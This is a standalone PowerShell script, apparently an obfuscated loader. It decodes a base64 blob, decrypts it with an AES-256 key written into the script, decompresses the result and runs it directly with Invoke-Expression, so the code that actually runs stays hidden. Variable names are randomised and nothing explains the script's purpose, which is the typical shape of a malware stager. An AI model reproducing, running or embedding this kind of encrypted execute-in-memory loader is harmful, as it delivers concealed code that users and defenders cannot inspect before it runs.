$jcPGdjVzcpwejmt = [System.Convert]::FromBase64String("U4MiW1K8hj/YnMvdRlfQatQ8UhurAdwq6LrlbUSYiMotN84GZBbek/u334+VUSFl40zDBn7DiA900ak4j7IXjaGmIT9km7an7bQoc/4roAvNlyel1oLA+olTHa7hqwtfSxS+gkLFhor1xOGGX5vXnTob1ZszKbIGg5pPol56A4IJSl4/FZIZfmxPoxNBf91AZsXWVls3Rm99TX6dOpomZWTiKXun//0EW1AjpNIPOS/24RP1G+Es/3dTWK4fQ/EsJcMBq1usA47Czix4QTS/f/r8CoKL927ickgDXLiE5pKY6vEuDnC2xW1uZeQ5IakwrOKrkopuKLHw+jf4wUQvvIsDVkIeFBbUUMbMeH6TDSGVlaWAuEoxP72hhYrV0hDFEyNEZkDOsjkt0LorKBGV0/QpmOmZsy30VZOLotYgnaT46XI/JnEPM1Q4TFlp4WoV1fGe65jKkyz7uDDdYc1ZjoooHP08h1i1Mwot1xARlURg0P1proGl550GI6kjciluhuQpAGSSz56JUsb1DBSu2Nbic0aoa4NXIlRJ0Dlu14Sod2a/0Hb6aDqQp6oyLxrqEhHygMeh/9FC3+bGPtmUtdqItZfpJ+bh3iuXnz2gJiUtxh8EeBEnQNePe8IJr8jKsG1NA6/wfr/RRdFhJuJrhPD2JsjifLW2pyWog7fi4o/YvyEvxaGxY/LqaKZwRDSMMhNbUMFzTbNOIGKHJ/Tfce7JciHTtCLLFUPlKiyJS8syQlvBi9AToXYIEelmZqz+VFKSnZBtH28W3nlt7D2w2emk/8wJGIVTnuogJg4ZBqUtEouKhfBO76BM1m6P9lEa426gHGsX/iQwAtX/O6LaDI+ykOtLOCf6GWRGP84OSI7QC9yfL8yx79GTOqSfgyk1LPFhlf3MygUG5pE4yTeMfW53+coQCcD6hxqu+4aEvFMfVfC4QkaQzlPckxzGuRty/JacfiWQWr/gKKBZR8U4ERMt21fzmpYn3XAQwrAA0yXBHztaFdSAmZBKNNaKodVkxmONFRlRw+lTBa6LY8kamBkoeSvGCWI2t6Kn/uiiwdgGd8y190GxxrgIEWTiiRb5iKUlze+ImBLI72wLCmKWXkdGK7I9QpgV9VWUnAbmjg24+P+UDT3ANFTsBWV76fh65O/LOHh0Ul6eTKLrCg60YygEQ2SazHr79eCR1QEJFP6Do3Hx/ml2+Ln01hQi0WIiaT3EdJVUMXPPJnPoumzzm3b/TiyrsBc9i1yRYdCJVJY6/BHyk98AoWWdZqvftLvJ8sKp4OpGJEX5B7K52lyVjuOBFZDi0Cb8qr+c7NMxjYc7ZsmSkLf1NrA7LqMU571j+dmeSSeFl5pHIUR7YwbkCA==")
$vcRdBGRgVwQHBDr = New-Object "System.Security.Cryptography.AesManaged"
$zBuC = [System.Convert]::FromBase64String("V0tXX4ocOuXhenUM0q0KFUSExSP0Ds36CncBzynwBTE=")
$vcRdBGRgVwQHBDr.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$vcRdBGRgVwQHBDr.Mode = [System.Security.Cryptography.CipherMode]::CBC
$vcRdBGRgVwQHBDr.BlockSize = 128
$vcRdBGRgVwQHBDr.IV = $jcPGdjVzcpwejmt[0..15]
$vcRdBGRgVwQHBDr.KeySize = 256
$vcRdBGRgVwQHBDr.Key = $zBuC
$IOiDgGyTBRstvtrHs = New-Object System.IO.MemoryStream(,$vcRdBGRgVwQHBDr.CreateDecryptor().TransformFinalBlock($jcPGdjVzcpwejmt,16,$jcPGdjVzcpwejmt.Length-16))
$eATRyqQ = New-Object System.IO.MemoryStream
$fsrLy = New-Object System.IO.Compression.DeflateStream $IOiDgGyTBRstvtrHs, ([IO.Compression.CompressionMode]::Decompress)
$fsrLy.CopyTo($eATRyqQ)
$IOiDgGyTBRstvtrHs.Close()
$ShPNNxsvwzpsjqjJKrrqG = [System.Text.Encoding]::UTF8.GetString($eATRyqQ.ToArray())
$vcRdBGRgVwQHBDr.Dispose()
$fsrLy.Close()
Invoke-Expression($ShPNNxsvwzpsjqjJKrrqG)
